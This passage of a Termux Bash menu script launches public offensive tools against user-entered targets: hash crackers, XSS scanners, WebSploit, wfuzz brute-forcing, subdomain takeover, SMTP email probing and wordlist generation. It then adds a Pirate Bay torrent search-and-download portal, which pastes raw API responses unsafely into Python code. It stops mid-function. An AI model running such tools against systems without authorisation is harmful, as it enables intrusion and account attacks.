                    _dv21; echo ""
                    printf "  ${WH}Auto-detect and crack MD5 · SHA1 · SHA256 · SHA512 hashes.${RESET}\n"
                    printf "  ${WH}Queries multiple online databases · cracks in seconds.${RESET}\n"
                    printf "  ${FADE}■ CTF and authorized use only · SOI · 999${RESET}\n"; echo ""
                    _dv21; echo ""
                    [[ -d ~/Hash-Buster ]] && printf "  ${GRN}✓ Installed — ~/Hash-Buster${RESET}\n" || printf "  ${YEL}✗ Not installed${RESET}\n"
                    echo ""
                    printf "  ${C21}${BOLD}[R]${RESET}  Run Hash-Buster\n"
                    printf "  ${C21}${BOLD}[I]${RESET}  Install / Update\n"
                    printf "  ${C21}${BOLD}[B]${RESET}  Back\n"
                    echo ""; _dv21; echo ""
                    printf "  ${C21}${BOLD}» ${RESET}"; read -r _hb21
                    case "${_hb21^^}" in
                        R) printf "  ${C21}Enter hash: ${RESET}"; read -r _hv
                           if [[ -d ~/Hash-Buster ]]; then python3 ~/Hash-Buster/hash-buster.py -s "$_hv"
                           else printf "  ${RED}Not installed — use [I] first${RESET}\n"; fi
                           echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        I) pkg update -y && pkg install -y python
                           git clone https://github.com/s0md3v/Hash-Buster ~/Hash-Buster 2>/dev/null || git -C ~/Hash-Buster pull
                           pip install requests --break-system-packages
                           printf "  ${GRN}✓ Done${RESET}\n"; sleep 1 ;;
                        B|b) break ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;

            # ── [22] XSSTRIKE ─────────────────────────────────────────────────
            22)
                while true; do
                    clear; echo ""
                    _dv21
                    printf "  ${C21}${BOLD}EXPLOITATION PORTAL  ·  [22] XSSTRIKE  ·  XSS SCANNER${RESET}\n"
                    _dv21; echo ""
                    printf "  ${WH}Advanced XSS scanner with WAF bypass and context analysis.${RESET}\n"
                    printf "  ${WH}Fuzzes params · detects reflected/DOM/stored XSS · multi-thread.${RESET}\n"
                    printf "  ${FADE}■ Authorized lab use only · SOI · 999${RESET}\n"; echo ""
                    _dv21; echo ""
                    [[ -d ~/XSStrike ]] && printf "  ${GRN}✓ Installed — ~/XSStrike${RESET}\n" || printf "  ${YEL}✗ Not installed${RESET}\n"
                    echo ""
                    printf "  ${C21}${BOLD}[R]${RESET}  Run XSStrike\n"
                    printf "  ${C21}${BOLD}[I]${RESET}  Install / Update\n"
                    printf "  ${C21}${BOLD}[B]${RESET}  Back\n"
                    echo ""; _dv21; echo ""
                    printf "  ${C21}${BOLD}» ${RESET}"; read -r _xs22
                    case "${_xs22^^}" in
                        R) printf "  ${C21}Target URL: ${RESET}"; read -r _xu
                           if [[ -d ~/XSStrike ]]; then python3 ~/XSStrike/xsstrike.py -u "$_xu"
                           else printf "  ${RED}Not installed — use [I] first${RESET}\n"; sleep 1; fi
                           echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        I) pkg update -y && pkg install -y python
                           git clone https://github.com/s0md3v/XSStrike ~/XSStrike 2>/dev/null || git -C ~/XSStrike pull
                           pip install -r ~/XSStrike/requirements.txt --break-system-packages
                           printf "  ${GRN}✓ Done${RESET}\n"; sleep 1 ;;
                        B|b) break ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;

            # ── [23] XSSCON ───────────────────────────────────────────────────
            23)
                while true; do
                    clear; echo ""
                    _dv21
                    printf "  ${C21}${BOLD}EXPLOITATION PORTAL  ·  [23] XSSCON  ·  FAST XSS SCANNER${RESET}\n"
                    _dv21; echo ""
                    printf "  ${WH}Concurrent multi-thread XSS scanner · fast bulk page scanning.${RESET}\n"
                    printf "  ${WH}Crawls all links · tests each parameter for XSS vulnerability.${RESET}\n"
                    printf "  ${FADE}■ Authorized lab use only · SOI · 999${RESET}\n"; echo ""
                    _dv21; echo ""
                    [[ -d ~/XSSCon ]] && printf "  ${GRN}✓ Installed — ~/XSSCon${RESET}\n" || printf "  ${YEL}✗ Not installed${RESET}\n"
                    echo ""
                    printf "  ${C21}${BOLD}[R]${RESET}  Run XSSCon\n"
                    printf "  ${C21}${BOLD}[I]${RESET}  Install / Update\n"
                    printf "  ${C21}${BOLD}[B]${RESET}  Back\n"
                    echo ""; _dv21; echo ""
                    printf "  ${C21}${BOLD}» ${RESET}"; read -r _xc23
                    case "${_xc23^^}" in
                        R) printf "  ${C21}Target URL: ${RESET}"; read -r _xu2
                           if [[ -d ~/XSSCon ]]; then python3 ~/XSSCon/xsscon.py --url "$_xu2"
                           else printf "  ${RED}Not installed — use [I] first${RESET}\n"; sleep 1; fi
                           echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        I) pkg update -y && pkg install -y python
                           git clone https://github.com/haroonawanofficial/XSSCon ~/XSSCon 2>/dev/null || git -C ~/XSSCon pull
                           pip install -r ~/XSSCon/requirements.txt --break-system-packages 2>/dev/null
                           printf "  ${GRN}✓ Done${RESET}\n"; sleep 1 ;;
                        B|b) break ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;

            # ── [24] WEBSPLOIT ────────────────────────────────────────────────
            24)
                while true; do
                    clear; echo ""
                    _dv21
                    printf "  ${C21}${BOLD}EXPLOITATION PORTAL  ·  [24] WEBSPLOIT  ·  WEB EXPLOIT FRAMEWORK${RESET}\n"
                    _dv21; echo ""
                    printf "  ${WH}Menu-driven framework: web scanning · network attacks · MITM.${RESET}\n"
                    printf "  ${WH}Modules: autopwn · wmap · sqlinjector · CSRF · clickjacking.${RESET}\n"
                    printf "  ${FADE}■ Authorized lab use only · SOI · 999${RESET}\n"; echo ""
                    _dv21; echo ""
                    command -v websploit &>/dev/null && printf "  ${GRN}✓ Installed${RESET}\n" || printf "  ${YEL}✗ Not installed${RESET}\n"
                    echo ""
                    printf "  ${C21}${BOLD}[R]${RESET}  Run WebSploit\n"
                    printf "  ${C21}${BOLD}[I]${RESET}  Install via pip\n"
                    printf "  ${C21}${BOLD}[B]${RESET}  Back\n"
                    echo ""; _dv21; echo ""
                    printf "  ${C21}${BOLD}» ${RESET}"; read -r _ws24
                    case "${_ws24^^}" in
                        R) websploit 2>/dev/null || printf "  ${RED}Not installed — use [I] first${RESET}\n"
                           echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        I) pip install websploit --break-system-packages
                           printf "  ${GRN}✓ Done — run: websploit${RESET}\n"; sleep 1 ;;
                        B|b) break ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;

            # ── [25] WFUZZ ────────────────────────────────────────────────────
            25)
                while true; do
                    clear; echo ""
                    _dv21
                    printf "  ${C21}${BOLD}EXPLOITATION PORTAL  ·  [25] WFUZZ  ·  WEB FUZZER${RESET}\n"
                    _dv21; echo ""
                    printf "  ${WH}Fuzz web apps for hidden dirs · params · login bruteforce.${RESET}\n"
                    printf "  ${WH}Usage: wfuzz -c -w wordlist.txt --hc 404 URL/FUZZ${RESET}\n"
                    printf "  ${FADE}■ Authorized lab use only · SOI · 999${RESET}\n"; echo ""
                    _dv21; echo ""
                    command -v wfuzz &>/dev/null && printf "  ${GRN}✓ Installed${RESET}\n" || printf "  ${YEL}✗ Not installed${RESET}\n"
                    echo ""
                    printf "  ${C21}${BOLD}[R]${RESET}  Run Wfuzz\n"
                    printf "  ${C21}${BOLD}[I]${RESET}  Install via pip\n"
                    printf "  ${C21}${BOLD}[B]${RESET}  Back\n"
                    echo ""; _dv21; echo ""
                    printf "  ${C21}${BOLD}» ${RESET}"; read -r _wf25
                    case "${_wf25^^}" in
                        R) printf "  ${C21}Target URL (use FUZZ as placeholder): ${RESET}"; read -r _wfu
                           printf "  ${C21}Wordlist path: ${RESET}"; read -r _wfw
                           wfuzz -c -w "${_wfw:-/data/data/com.termux/files/usr/share/wordlists/dirb/common.txt}" --hc 404 "$_wfu" 2>/dev/null \
                               || printf "  ${RED}Not installed — use [I] first${RESET}\n"
                           echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        I) pip install wfuzz --break-system-packages
                           printf "  ${GRN}✓ Done — run: wfuzz${RESET}\n"; sleep 1 ;;
                        B|b) break ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;

            # ── [26] TAKEOVER ─────────────────────────────────────────────────
            26)
                while true; do
                    clear; echo ""
                    _dv21
                    printf "  ${C21}${BOLD}EXPLOITATION PORTAL  ·  [26] TAKEOVER  ·  SUBDOMAIN TAKEOVER${RESET}\n"
                    _dv21; echo ""
                    printf "  ${WH}Scan for vulnerable subdomains across 100+ services.${RESET}\n"
                    printf "  ${WH}Detects unclaimed CNAMEs on AWS · GitHub · Heroku · Shopify.${RESET}\n"
                    printf "  ${FADE}■ Authorized lab use only · SOI · 999${RESET}\n"; echo ""
                    _dv21; echo ""
                    [[ -d ~/takeover ]] && printf "  ${GRN}✓ Installed — ~/takeover${RESET}\n" || printf "  ${YEL}✗ Not installed${RESET}\n"
                    echo ""
                    printf "  ${C21}${BOLD}[R]${RESET}  Run TakeOver\n"
                    printf "  ${C21}${BOLD}[I]${RESET}  Install / Update\n"
                    printf "  ${C21}${BOLD}[B]${RESET}  Back\n"
                    echo ""; _dv21; echo ""
                    printf "  ${C21}${BOLD}» ${RESET}"; read -r _to26
                    case "${_to26^^}" in
                        R) printf "  ${C21}Target domain: ${RESET}"; read -r _tod
                           if [[ -d ~/takeover ]]; then python3 ~/takeover/takeover.py -d "$_tod"
                           else printf "  ${RED}Not installed — use [I] first${RESET}\n"; sleep 1; fi
                           echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        I) pkg update -y && pkg install -y python
                           git clone https://github.com/m4ll0k/takeover ~/takeover 2>/dev/null || git -C ~/takeover pull
                           pip install -r ~/takeover/requirements.txt --break-system-packages 2>/dev/null
                           printf "  ${GRN}✓ Done${RESET}\n"; sleep 1 ;;
                        B|b) break ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;

            # ── [27] WHATWEB ──────────────────────────────────────────────────
            27)
                while true; do
                    clear; echo ""
                    _dv21
                    printf "  ${C21}${BOLD}EXPLOITATION PORTAL  ·  [27] WHATWEB  ·  WEB FINGERPRINTER${RESET}\n"
                    _dv21; echo ""
                    printf "  ${WH}Identify CMS · frameworks · server software · plugins · version.${RESET}\n"
                    printf "  ${WH}1800+ plugins · aggressive or stealthy scan modes.${RESET}\n"
                    printf "  ${FADE}■ Recon tool — authorized use only · SOI · 999${RESET}\n"; echo ""
                    _dv21; echo ""
                    command -v whatweb &>/dev/null && printf "  ${GRN}✓ Installed${RESET}\n" || printf "  ${YEL}✗ Not installed — pkg install whatweb${RESET}\n"
                    echo ""
                    printf "  ${C21}${BOLD}[R]${RESET}  Run WhatWeb\n"
                    printf "  ${C21}${BOLD}[I]${RESET}  Install via pkg\n"
                    printf "  ${C21}${BOLD}[B]${RESET}  Back\n"
                    echo ""; _dv21; echo ""
                    printf "  ${C21}${BOLD}» ${RESET}"; read -r _ww27
                    case "${_ww27^^}" in
                        R) printf "  ${C21}Target URL: ${RESET}"; read -r _wwu
                           whatweb "$_wwu" 2>/dev/null || printf "  ${RED}Not installed — use [I] first${RESET}\n"
                           echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        I) pkg update -y && pkg install -y whatweb
                           printf "  ${GRN}✓ Done${RESET}\n"; sleep 1 ;;
                        B|b) break ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;

            # ── [28] PWNEDORNOT ───────────────────────────────────────────────
            28)
                while true; do
                    clear; echo ""
                    _dv21
                    printf "  ${C21}${BOLD}EXPLOITATION PORTAL  ·  [28] PWNEDORNOT  ·  EMAIL BREACH CHECK${RESET}\n"
                    _dv21; echo ""
                    printf "  ${WH}Check if an email appears in known data breach databases.${RESET}\n"
                    printf "  ${WH}Returns breach name · date · leaked passwords if available.${RESET}\n"
                    printf "  ${FADE}■ OSINT tool — authorized use only · SOI · 999${RESET}\n"; echo ""
                    _dv21; echo ""
                    [[ -d ~/pwnedornot ]] && printf "  ${GRN}✓ Installed — ~/pwnedornot${RESET}\n" || printf "  ${YEL}✗ Not installed${RESET}\n"
                    echo ""
                    printf "  ${C21}${BOLD}[R]${RESET}  Run PwnedOrNot\n"
                    printf "  ${C21}${BOLD}[I]${RESET}  Install / Update\n"
                    printf "  ${C21}${BOLD}[B]${RESET}  Back\n"
                    echo ""; _dv21; echo ""
                    printf "  ${C21}${BOLD}» ${RESET}"; read -r _po28
                    case "${_po28^^}" in
                        R) printf "  ${C21}Email to check: ${RESET}"; read -r _poe
                           if [[ -d ~/pwnedornot ]]; then python3 ~/pwnedornot/pwnedornot.py -e "$_poe"
                           else printf "  ${RED}Not installed — use [I] first${RESET}\n"; sleep 1; fi
                           echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        I) pkg update -y && pkg install -y python
                           git clone https://github.com/thewhiteh4t/pwnedornot ~/pwnedornot 2>/dev/null || git -C ~/pwnedornot pull
                           pip install -r ~/pwnedornot/requirements.txt --break-system-packages 2>/dev/null
                           printf "  ${GRN}✓ Done${RESET}\n"; sleep 1 ;;
                        B|b) break ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;

            # ── [29] KNOCKMAIL ────────────────────────────────────────────────
            29)
                while true; do
                    clear; echo ""
                    _dv21
                    printf "  ${C21}${BOLD}EXPLOITATION PORTAL  ·  [29] KNOCKMAIL  ·  EMAIL VALIDATOR${RESET}\n"
                    _dv21; echo ""
                    printf "  ${WH}Verify if email addresses are valid via SMTP handshake.${RESET}\n"
                    printf "  ${WH}No email sent — probes the mail server silently.${RESET}\n"
                    printf "  ${FADE}■ OSINT recon tool — authorized use only · SOI · 999${RESET}\n"; echo ""
                    _dv21; echo ""
                    [[ -d ~/KnockMail ]] && printf "  ${GRN}✓ Installed — ~/KnockMail${RESET}\n" || printf "  ${YEL}✗ Not installed${RESET}\n"
                    echo ""
                    printf "  ${C21}${BOLD}[R]${RESET}  Run KnockMail\n"
                    printf "  ${C21}${BOLD}[I]${RESET}  Install / Update\n"
                    printf "  ${C21}${BOLD}[B]${RESET}  Back\n"
                    echo ""; _dv21; echo ""
                    printf "  ${C21}${BOLD}» ${RESET}"; read -r _km29
                    case "${_km29^^}" in
                        R) printf "  ${C21}Email to verify: ${RESET}"; read -r _kme
                           if [[ -d ~/KnockMail ]]; then python3 ~/KnockMail/knockmail.py "$_kme"
                           else printf "  ${RED}Not installed — use [I] first${RESET}\n"; sleep 1; fi
                           echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        I) pkg update -y && pkg install -y python
                           git clone https://github.com/4w4k3/KnockMail ~/KnockMail 2>/dev/null || git -C ~/KnockMail pull
                           pip install -r ~/KnockMail/requirements.txt --break-system-packages 2>/dev/null
                           printf "  ${GRN}✓ Done${RESET}\n"; sleep 1 ;;
                        B|b) break ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;

            # ── [30] RANG3R ───────────────────────────────────────────────────
            30)
                while true; do
                    clear; echo ""
                    _dv21
                    printf "  ${C21}${BOLD}EXPLOITATION PORTAL  ·  [30] RANG3R  ·  PORT SCANNER${RESET}\n"
                    _dv21; echo ""
                    printf "  ${WH}Fast port scanner with banner grabbing and service detection.${RESET}\n"
                    printf "  ${WH}Scans ranges · identifies open ports · grabs service banners.${RESET}\n"
                    printf "  ${FADE}■ Authorized lab use only · SOI · 999${RESET}\n"; echo ""
                    _dv21; echo ""
                    [[ -d ~/rang3r ]] && printf "  ${GRN}✓ Installed — ~/rang3r${RESET}\n" || printf "  ${YEL}✗ Not installed${RESET}\n"
                    echo ""
                    printf "  ${C21}${BOLD}[R]${RESET}  Run Rang3r\n"
                    printf "  ${C21}${BOLD}[I]${RESET}  Install / Update\n"
                    printf "  ${C21}${BOLD}[B]${RESET}  Back\n"
                    echo ""; _dv21; echo ""
                    printf "  ${C21}${BOLD}» ${RESET}"; read -r _rg30
                    case "${_rg30^^}" in
                        R) printf "  ${C21}Target IP/domain: ${RESET}"; read -r _rgt
                           if [[ -d ~/rang3r ]]; then python3 ~/rang3r/rang3r.py -i "$_rgt"
                           else printf "  ${RED}Not installed — use [I] first${RESET}\n"; sleep 1; fi
                           echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        I) pkg update -y && pkg install -y python
                           git clone https://github.com/zerobyte-id/Rang3r ~/rang3r 2>/dev/null || git -C ~/rang3r pull
                           pip install -r ~/rang3r/requirements.txt --break-system-packages 2>/dev/null
                           printf "  ${GRN}✓ Done${RESET}\n"; sleep 1 ;;
                        B|b) break ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;

            # ── [31] DARKDUMP ─────────────────────────────────────────────────
            31)
                while true; do
                    clear; echo ""
                    _dv21
                    printf "  ${C21}${BOLD}EXPLOITATION PORTAL  ·  [31] DARKDUMP  ·  DARK WEB SEARCH${RESET}\n"
                    _dv21; echo ""
                    printf "  ${WH}Search the dark web via Ahmia search engine — no Tor needed.${RESET}\n"
                    printf "  ${WH}Returns .onion links · site titles · descriptions per query.${RESET}\n"
                    printf "  ${FADE}■ Research tool — authorized use only · SOI · 999${RESET}\n"; echo ""
                    _dv21; echo ""
                    [[ -d ~/darkdump ]] && printf "  ${GRN}✓ Installed — ~/darkdump${RESET}\n" || printf "  ${YEL}✗ Not installed${RESET}\n"
                    echo ""
                    printf "  ${C21}${BOLD}[R]${RESET}  Run DarkDump search\n"
                    printf "  ${C21}${BOLD}[I]${RESET}  Install / Update\n"
                    printf "  ${C21}${BOLD}[B]${RESET}  Back\n"
                    echo ""; _dv21; echo ""
                    printf "  ${C21}${BOLD}» ${RESET}"; read -r _dd31
                    case "${_dd31^^}" in
                        R) printf "  ${C21}Search query: ${RESET}"; read -r _ddq
                           if [[ -d ~/darkdump ]]; then python3 ~/darkdump/darkdump.py --query "$_ddq"
                           else printf "  ${RED}Not installed — use [I] first${RESET}\n"; sleep 1; fi
                           echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        I) pkg update -y && pkg install -y python
                           git clone https://github.com/josh0x/darkdump ~/darkdump 2>/dev/null || git -C ~/darkdump pull
                           pip install -r ~/darkdump/requirements.txt --break-system-packages 2>/dev/null
                           printf "  ${GRN}✓ Done${RESET}\n"; sleep 1 ;;
                        B|b) break ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;

            # ── [32] WLCREATOR ────────────────────────────────────────────────
            32)
                while true; do
                    clear; echo ""
                    _dv21
                    printf "  ${C21}${BOLD}EXPLOITATION PORTAL  ·  [32] WLCREATOR  ·  WORDLIST GENERATOR${RESET}\n"
                    _dv21; echo ""
                    printf "  ${WH}Generate target-specific wordlists from name · DOB · keywords.${RESET}\n"
                    printf "  ${WH}Outputs combinations · leet speak · case mutations · numbers.${RESET}\n"
                    printf "  ${FADE}■ CTF and authorized brute force use only · SOI · 999${RESET}\n"; echo ""
                    _dv21; echo ""
                    [[ -d ~/WlCreator ]] && printf "  ${GRN}✓ Installed — ~/WlCreator${RESET}\n" || printf "  ${YEL}✗ Not installed${RESET}\n"
                    echo ""
                    printf "  ${C21}${BOLD}[R]${RESET}  Run WlCreator\n"
                    printf "  ${C21}${BOLD}[I]${RESET}  Install / Update\n"
                    printf "  ${C21}${BOLD}[B]${RESET}  Back\n"
                    echo ""; _dv21; echo ""
                    printf "  ${C21}${BOLD}» ${RESET}"; read -r _wl32
                    case "${_wl32^^}" in
                        R) if [[ -d ~/WlCreator ]]; then python3 ~/WlCreator/wlcreator.py
                           else printf "  ${RED}Not installed — use [I] first${RESET}\n"; sleep 1; fi
                           echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        I) pkg update -y && pkg install -y python
                           git clone https://github.com/6e726d/WlCreator ~/WlCreator 2>/dev/null || git -C ~/WlCreator pull
                           printf "  ${GRN}✓ Done${RESET}\n"; sleep 1 ;;
                        B|b) break ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;

            B) return 0 ;;
            M) media_station_portal; return ;;
            *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
        esac
    done 2>/dev/null
}

# ═══════════════════════════════════════════════════════════════════
#  PORTAL COLOUR [22] + [23]
# ═══════════════════════════════════════════════════════════════════
AMBER='\033[38;5;214m'
C23="${AMBER}"     # Torrent Portal — amber

_dv23() { printf "${C23}"; printf "%${COLS}s" "" | tr ' ' '━'; printf "${RESET}\n"; }

VIOLET='\033[38;5;99m'
C24="${VIOLET}"    # Termux Desktop — violet
SEAFOAM='\033[38;5;79m'
C25="${SEAFOAM}"   # File Manager — seafoam
HIORG='\033[38;5;202m'
C26="${HIORG}"     # Shortcut Builder — orange-red

_dv24() { printf "${C24}"; printf "%${COLS}s" "" | tr ' ' '━'; printf "${RESET}\n"; }
_dv25() { printf "${C25}"; printf "%${COLS}s" "" | tr ' ' '━'; printf "${RESET}\n"; }
_dv26() { printf "${C26}"; printf "%${COLS}s" "" | tr ' ' '━'; printf "${RESET}\n"; }

AQUA='\033[38;5;45m'
C27="${AQUA}"      # FOSS App Discovery — aqua
NEONGRN='\033[38;5;118m'
C28="${NEONGRN}"   # Termux Encyclopedia — neon green
DEEPPUR='\033[38;5;141m'
C29="${DEEPPUR}"   # Fezzy Artist Portal — deep purple
HOTCORAL='\033[38;5;210m'
C30="${HOTCORAL}"  # Local Music Player — hot coral

_dv27() { printf "${C27}"; printf "%${COLS}s" "" | tr ' ' '━'; printf "${RESET}\n"; }
_dv28() { printf "${C28}"; printf "%${COLS}s" "" | tr ' ' '━'; printf "${RESET}\n"; }
_dv29() { printf "${C29}"; printf "%${COLS}s" "" | tr ' ' '━'; printf "${RESET}\n"; }
_dv30() { printf "${C30}"; printf "%${COLS}s" "" | tr ' ' '━'; printf "${RESET}\n"; }

# ═══════════════════════════════════════════════════════════════════
#  [22] ENCRYPTION PORTAL
# ═══════════════════════════════════════════════════════════════════

encryption_portal() {
    clear
    echo ""
    _dv22
    printf "  ${C22}${BOLD}▶  ENCRYPTION PORTAL  ·  GPG · AES-256 · SECURE DELETE  ·  999${RESET}\n"
    _dv22
    echo ""
    _spin "Loading cryptographic modules" 0.5 "${C22}"
    _spin "Initialising GPG keyring" 0.4 "${FADE}"
    _spin "AES-256 cipher engine ready" 0.4 "${C22}"
    _spin "Vault filesystem mounted" 0.3 "${FADE}"
    _spin "Shred protocols standing by" 0.3 "${C22}"
    echo ""
    _dv22
    echo ""
    _countdown "ENCRYPTION PORTAL LOCKED IN"
    printf "  ${FADE}Encrypt before you share. Shred what must not exist. 999.${RESET}\n"
    echo ""
    _dv22
    echo ""
    sleep 0.3
    _encryption_vault
}

# ═══════════════════════════════════════════════════════════════════
#  [23] TORRENT PORTAL — SEARCH · FETCH · DOWNLOAD IN TERMINAL
# ═══════════════════════════════════════════════════════════════════

TORDIR=~/storage/downloads/torrents

torrent_portal() {
    mkdir -p "$TORDIR" 2>/dev/null

    # ── one-time boot ───────────────────────────────────────────────
    clear
    echo ""
    _dv23
    printf "  ${C23}${BOLD}▶  TORRENT PORTAL  ·  SEARCH · FETCH · DOWNLOAD  ·  SOI  ·  999${RESET}\n"
    _dv23
    echo ""
    _spin "Connecting to torrent search API" 0.5 "${C23}"
    _spin "Loading category filters" 0.3 "${FADE}"
    _spin "aria2c download engine ready" 0.4 "${C23}"
    echo ""
    _dv23
    echo ""
    _countdown "TORRENT PORTAL LOCKED IN"
    printf "  ${FADE}Search. Pick. Download. All inside Termux. Nothing leaves the page.${RESET}\n"
    echo ""
    _dv23
    echo ""
    sleep 0.3

    # ── standard trackers for magnet links ──────────────────────────
    local TRACKERS="&tr=udp%3A%2F%2Ftracker.opentrackr.org%3A1337%2Fannounce&tr=udp%3A%2F%2Fopen.tracker.cl%3A1337%2Fannounce&tr=udp%3A%2F%2Ftracker.openbits.net%3A80%2Fannounce&tr=udp%3A%2F%2Fexodus.desync.com%3A6969%2Fannounce&tr=udp%3A%2F%2Ftracker.torrent.eu.org%3A451%2Fannounce"

    # ── search function — hits TPB API, stays in terminal ───────────
    _torrent_search() {
        local query="$1" cat_filter="${2:-0}"
        local cat_label="${3:-ALL}"
        echo ""
        _dv23
        printf "  ${C23}[*] Searching: ${WH}%s${RESET}  ${FADE}[%s]${RESET}\n" "$query" "$cat_label"
        _dv23
        echo ""

        local enc_q
        enc_q=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$query" 2>/dev/null)

        # proxy-aware fetch
        local fetch_cmd="curl -s --max-time 15"
        [[ $FEZZY_PROXY_ACTIVE -eq 1 ]] && fetch_cmd="$FEZZY_PROXY_CMD curl -s --max-time 15"

        local raw
        raw=$($fetch_cmd \
            -H "User-Agent: Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0" \
            "https://apibay.org/q.php?q=${enc_q}&cat=${cat_filter}" 2>/dev/null)

        if [[ -z "$raw" || "$raw" == "[]" || "$raw" == *'"name":"No results returned"'* ]]; then
            printf "  ${YEL}No results found — try a different search term${RESET}\n"
            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r
            return 1
        fi

        # parse and display results
        python3 - <<PYEOF
import json, sys

raw = """$raw"""
try:
    results = json.loads(raw)
except:
    print("  Parse error — API may be down")
    sys.exit(1)

cat_map = {
    "100":"Audio","101":"Music","102":"Audio Books","103":"Sound Clips","104":"FLAC",
    "200":"Video","201":"Movies","202":"Movies DVDR","203":"Music Videos","204":"Movie Clips",
    "205":"TV Shows","206":"Handheld","207":"Movies HD","208":"TV Shows HD","209":"Movies 3D",
    "300":"Apps","301":"Windows","302":"Mac","303":"UNIX","304":"Handheld","305":"iOS","306":"Android",
    "400":"Games","401":"PC","402":"Mac","403":"PSx","404":"XBOX360","405":"Wii","406":"Handheld",
    "500":"Porn","600":"Other","601":"E-books","602":"Comics","603":"Pictures","604":"Covers","605":"Physibles","606":"Other"
}

def fmt_size(b):
    b = int(b)
    if b > 1073741824: return f"{b/1073741824:.1f} GB"
    if b > 1048576:    return f"{b/1048576:.1f} MB"
    return f"{b/1024:.1f} KB"

print(f"  Results found: {len(results[:15])}")
print()
for i, r in enumerate(results[:15], 1):
    name     = r.get("name","?")[:60]
    seeders  = r.get("seeders","0")
    leechers = r.get("leechers","0")
    size     = fmt_size(r.get("size","0"))
    cat      = cat_map.get(r.get("category","0"), "Other")
    ih       = r.get("info_hash","")
    seed_col = "\033[38;5;46m" if int(seeders) > 10 else ("\033[38;5;226m" if int(seeders) > 0 else "\033[38;5;196m")
    reset    = "\033[0m"
    fade     = "\033[38;5;238m"
    c23      = "\033[38;5;214m"
    bold     = "\033[1m"
    print(f"  {c23}{bold}[{i:2}]{reset}  {name}")
    print(f"        {seed_col}▲ {seeders} seed{reset}  {fade}▼ {leechers} leech  ·  {size}  ·  {cat}{reset}")
    print()
PYEOF

        echo ""
        printf "  ${C23}${BOLD}Pick number to download [1-15] or [0] to cancel: ${RESET}"
        read -r pick

        [[ "$pick" == "0" || -z "$pick" ]] && return 0
        [[ ! "$pick" =~ ^[0-9]+$ ]] && { printf "  ${RED}Invalid${RESET}\n"; return 1; }

        # extract chosen hash and name
        local chosen_hash chosen_name
        chosen_hash=$(python3 -c "
import json
try:
    r = json.loads('''$raw''')
    idx = int('$pick') - 1
    print(r[idx].get('info_hash',''))
except: print('')
" 2>/dev/null)
        chosen_name=$(python3 -c "
import json
try:
    r = json.loads('''$raw''')
    idx = int('$pick') - 1
    print(r[idx].get('name','download'))
except: print('download')
" 2>/dev/null)

        if [[ -z "$chosen_hash" ]]; then
            printf "  ${RED}Could not get torrent hash — pick out of range?${RESET}\n"
            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r
            return 1
        fi

        local enc_name
        enc_name=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$chosen_name" 2>/dev/null)
        local magnet="magnet:?xt=urn:btih:${chosen_hash}&dn=${enc_name}${TRACKERS}"

        echo ""
        _dv23
        printf "  ${C23}${BOLD}SELECTED:${RESET} ${WH}%s${RESET}\n" "$chosen_name"
        printf "  ${FADE}Hash: %s${RESET}\n" "$chosen_hash"
        echo ""
        printf "  ${C23}${BOLD}[D]${RESET}  ${WH}Download with aria2c${RESET}  ·  ${C23}${BOLD}[M]${RESET}  ${WH}Show magnet link${RESET}  ·  ${FADE}[b] Cancel${RESET}\n"
        echo ""
        printf "  ${C23}${BOLD}Choice » ${RESET}"
        read -r dl_ch

        case "${dl_ch^^}" in
            D)
                if ! command -v aria2c &>/dev/null; then
                    printf "  ${RED}aria2c not installed — run [I] Install Tools first${RESET}\n"
                    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r
                    return 1
                fi
                echo ""
                printf "  ${C23}[*] Starting download → %s${RESET}\n\n" "$TORDIR"
                _dv23
                echo ""
                local aria_cmd="aria2c"
                [[ $FEZZY_PROXY_ACTIVE -eq 1 ]] && aria_cmd="$FEZZY_PROXY_CMD aria2c"
                $aria_cmd \
                    --dir="$TORDIR" \
                    --seed-time=0 \
                    --max-connection-per-server=4 \
                    --split=4 \
                    --continue=true \
                    --console-log-level=notice \
                    "$magnet" 2>/dev/null
                echo ""
                printf "  ${GRN}✓ Download complete — files in: %s${RESET}\n" "$TORDIR"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            M)
                echo ""
